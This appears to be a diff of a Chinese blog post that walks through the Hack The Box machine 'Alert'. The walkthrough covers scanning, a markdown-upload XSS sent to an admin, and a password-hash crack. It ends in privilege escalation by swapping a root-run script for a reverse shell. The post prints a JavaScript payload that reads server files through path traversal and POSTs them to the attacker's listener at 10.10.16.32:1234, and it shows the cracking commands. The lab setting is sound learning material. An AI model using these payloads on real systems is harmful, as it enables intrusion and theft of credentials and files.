@@ -8,12 +8,12 @@
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="nmap扫描123nmap -sC -sV -T4 -Pn 10.10.11.44   发现域名alert.htb将其加入到hosts文件里  子域名扫描12345ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;alert.htb&#x2F; -H &quot;Host:FUZZ.alert.h">
+    <meta name="description" content="nmap扫描 123nmap -sC -sV -T4 -Pn 10.10.11.44  发现域名alert.htb将其加入到hosts文件里  子域名扫描 12345ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;alert.htb&#x2F; -H &quot;Host:FUZZ.alert.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Alert">
 <meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Alert/index.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="nmap扫描123nmap -sC -sV -T4 -Pn 10.10.11.44   发现域名alert.htb将其加入到hosts文件里  子域名扫描12345ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;alert.htb&#x2F; -H &quot;Host:FUZZ.alert.h">
+<meta property="og:description" content="nmap扫描 123nmap -sC -sV -T4 -Pn 10.10.11.44  发现域名alert.htb将其加入到hosts文件里  子域名扫描 12345ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;alert.htb&#x2F; -H &quot;Host:FUZZ.alert.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011531560-4ad35699-f24f-45de-8457-32e0d2673b19.png">
 <meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011610979-27468c86-374a-4e14-9441-ff79155ee42e.png">
@@ -209,71 +209,69 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -T4 -Pn <span class="number">10.10</span><span class="number">.11</span><span class="number">.44</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011531560-4ad35699-f24f-45de-8457-32e0d2673b19.png"></p>
+    <h2 id="nmap扫描">nmap扫描</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -T4 -Pn <span class="number">10.10</span><span class="number">.11</span><span class="number">.44</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011531560-4ad35699-f24f-45de-8457-32e0d2673b19.png" alt=""></p>
 <p>发现域名alert.htb将其加入到hosts文件里</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011610979-27468c86-374a-4e14-9441-ff79155ee42e.png"></p>
-<h2 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-<span class="number">20000.</span>txt -u http:<span class="comment">//alert.htb/ -H &quot;Host:FUZZ.alert.htb&quot; -fc 301</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734012003966-f4dc5256-4552-438b-b686-6dc07c8e4ab3.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011610979-27468c86-374a-4e14-9441-ff79155ee42e.png" alt=""></p>
+<h2 id="子域名扫描">子域名扫描</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-<span class="number">20000.</span>txt -u http:<span class="comment">//alert.htb/ -H &quot;Host:FUZZ.alert.htb&quot; -fc 301</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734012003966-f4dc5256-4552-438b-b686-6dc07c8e4ab3.png" alt=""></p>
 <p>扫描到一个子域名同样也加入到hosts里面。</p>
-<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>下面打开主页面</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015219181-fa72cdbd-36f9-4575-8183-a8f036c407fe.png"></p>
+<h2 id="xss">xss</h2>
+<p>下面打开主页面</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015219181-fa72cdbd-36f9-4575-8183-a8f036c407fe.png" alt=""></p>
 <p>可以看到有一个上传md的页面我们可以联想到xss</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015248168-729e9cb2-ca50-4ac5-a395-769ea386affa.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015248168-729e9cb2-ca50-4ac5-a395-769ea386affa.png" alt=""></p>
 <p>可以看到已经触发了xss。</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015296663-1ab21cd0-e12f-46ac-b7cb-cd5b1640f9f3.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015296663-1ab21cd0-e12f-46ac-b7cb-cd5b1640f9f3.png" alt=""></p>
 <p>同时在上传页面中有一个分享上传的链接的按钮猜测是可以发送</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015330910-ded2653b-909b-42d7-8f32-8b577473903f.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015330910-ded2653b-909b-42d7-8f32-8b577473903f.png" alt=""></p>
 <p>这里有一个发送页面抓包查看一下</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015356440-d8b2eb0e-4f23-41d0-8f14-a7b02c8381ca.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015356440-d8b2eb0e-4f23-41d0-8f14-a7b02c8381ca.png" alt=""></p>
 <p>在这里改成我们自己监听的ip端口可以接收到请求</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015399661-8fd6adf7-afb1-436a-bdf0-073d6f19e23a.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015399661-8fd6adf7-afb1-436a-bdf0-073d6f19e23a.png" alt=""></p>
 <p>所以可以推测我们发送的链接后台会点机该链接</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路：首先，上传带有恶意<code>js</code>代码的<code>md</code>文件，向管理员发送该<code>md</code>文件的链接，诱导管理员访问该<code>md</code>页面，当管理员访问了上传的<code>md</code>文件时，<code>md</code>夹带的恶意<code>js</code>代码工作，从管理员的客户端发起对<code>http://alert.htb</code>的请求，并将请求获得的响应内容发送至我们的攻击机。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>思路：首先，上传带有恶意<code>js</code>代码的<code>md</code>文件，向管理员发送该<code>md</code>文件的链接，诱导管理员访问该<code>md</code>页面，当管理员访问了上传的<code>md</code>文件时，<code>md</code>夹带的恶意<code>js</code>代码工作，从管理员的客户端发起对<code>http://alert.htb</code>的请求，并将请求获得的响应内容发送至我们的攻击机。</p>
 <p>不同与其他<code>xss</code>窃取<code>cookie</code>的思路，这里是为了看到一些只有管理员权限才能看见的㊙️🍯东西。</p>
 <p>编写并上传恶意<code>md</code>文件</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018247182-761d6f1c-42ed-4744-9c16-511c6fd795bf.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018247182-761d6f1c-42ed-4744-9c16-511c6fd795bf.png" alt=""></p>
 <p>这段代码的意思可以自行查看gpt的解释就是客户端会请求alert.htb这个域名然后将返回的text发送到我们监听的1234端口上</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018705149-4afe640b-957d-42aa-b5f4-ab7ac8cc44e9.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018705149-4afe640b-957d-42aa-b5f4-ab7ac8cc44e9.png" alt=""></p>
 <p>可以看到多了一个messages参数</p>
-<p>在深入利用一下只需要将index.php?page&#x3D;messages加到url参数后面在发送一遍触发一遍xss就可以得到回显</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734022833362-579d728d-8292-4bf0-a0a0-f3d0f59d552b.png"></p>
+<p>在深入利用一下只需要将index.php?page=messages加到url参数后面在发送一遍触发一遍xss就可以得到回显</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734022833362-579d728d-8292-4bf0-a0a0-f3d0f59d552b.png" alt=""></p>
 <p>这里在重复上一步操作可以得到回显读取到内容</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734023123154-2a212eac-8797-4d6b-998a-313a34cb5f86.png"></p>
-<p>所以这里我们是能够想到他是有文件包含读取功能的，这里我就不记录踩坑的过程了，读常规的&#x2F;etc&#x2F;passwd是读不到的，这里需要了解下htpasswd文件</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734023123154-2a212eac-8797-4d6b-998a-313a34cb5f86.png" alt=""></p>
+<p>所以这里我们是能够想到他是有文件包含读取功能的，这里我就不记录踩坑的过程了，读常规的/etc/passwd是读不到的，这里需要了解下htpasswd文件</p>
 <p>参考这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/cunjiu9486/article/details/109071899">https://blog.csdn.net/cunjiu9486/article/details/109071899</a></p>
 <p><code>apache2</code>网页认证的密码一般存在<code>.htapasswd</code>中。所以接下来就是去构造读取这个文件获取账户密码了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#####asasdfasdf</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&quot;http://alert.htb/messages.php?file=../../../../../../etc/apache2/sites-available/000-default.conf&quot;</span>)</span><br><span class="line"></span><br><span class="line">.then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">.then(data =&gt; fetch(<span class="string">&quot;http://10.10.16.32:1234&quot;</span>, &#123;</span><br><span class="line"></span><br><span class="line">method: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line"></span><br><span class="line">body: data</span><br><span class="line"></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065054504-18183843-5f31-4463-87f0-355fc99e587a.png"></p>
-<p>已经传上去解析到了。下面就是发送xss触发一下了 <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065204080-5da90bb8-1436-4a84-8d65-8898b3ec9ec0.png"></p>
-<p>触发成功，发现了htpasswd的存放路径&#x2F;var&#x2F;www&#x2F;statistics.alert.htb&#x2F;.htpasswd，所以继续重复上一个步骤继续重放</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065779352-79a0726f-874a-4118-93b5-a91ad9984c90.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065054504-18183843-5f31-4463-87f0-355fc99e587a.png" alt=""></p>
+<p>已经传上去解析到了。下面就是发送xss触发一下了 <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065204080-5da90bb8-1436-4a84-8d65-8898b3ec9ec0.png" alt=""></p>
+<p>触发成功，发现了htpasswd的存放路径/var/www/statistics.alert.htb/.htpasswd，所以继续重复上一个步骤继续重放</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065779352-79a0726f-874a-4118-93b5-a91ad9984c90.png" alt=""></p>
 <p>读到了一个加密的密码</p>
 <p>使用jhon爆破下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-<span class="type">long</span> alert.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>hashcat</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat -m <span class="number">1600</span> -a <span class="number">0</span> passwd ~/Documents/rockyou.txt --username --show</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066195390-204e6dbb-79d5-442a-9373-f571c6698cca.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066195390-204e6dbb-79d5-442a-9373-f571c6698cca.png" alt=""></p>
 <p>还需要show一下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --show alert.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066330579-398f2598-c9e7-42d0-8024-bc968ae7dd5d.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066330579-398f2598-c9e7-42d0-8024-bc968ae7dd5d.png" alt=""></p>
 <p>然后ssh连接即可</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734068966585-494fa4f9-0229-48f3-9418-bf97f9009ee5.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069006557-e05e3fef-ce0d-4213-b8a8-1dd19c9362d1.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734068966585-494fa4f9-0229-48f3-9418-bf97f9009ee5.png" alt=""></p>
+<h2 id="提权">提权</h2>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069006557-e05e3fef-ce0d-4213-b8a8-1dd19c9362d1.png" alt=""></p>
 <p>发现有一个8080端口开着，这样的话就将该端口转发一下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L <span class="number">8080</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> albert<span class="meta">@alert</span>.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069898682-dbb24f6a-1545-4c6c-8b4e-a1d696cb9229.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069898682-dbb24f6a-1545-4c6c-8b4e-a1d696cb9229.png" alt=""></p>
 <p>去找一下这个website monitor文件夹</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069775933-fd693f4f-434a-4471-8444-37614e783bc3.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069775933-fd693f4f-434a-4471-8444-37614e783bc3.png" alt=""></p>
 <p>在opt目录下有一个root权限的文件替换一下改成反弹shell的脚本就可以反弹回来了</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069539804-cee036c2-79ee-424c-97af-c36b9cbc5c8f.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069539804-cee036c2-79ee-424c-97af-c36b9cbc5c8f.png" alt=""></p>
 
   </div>
 </article>
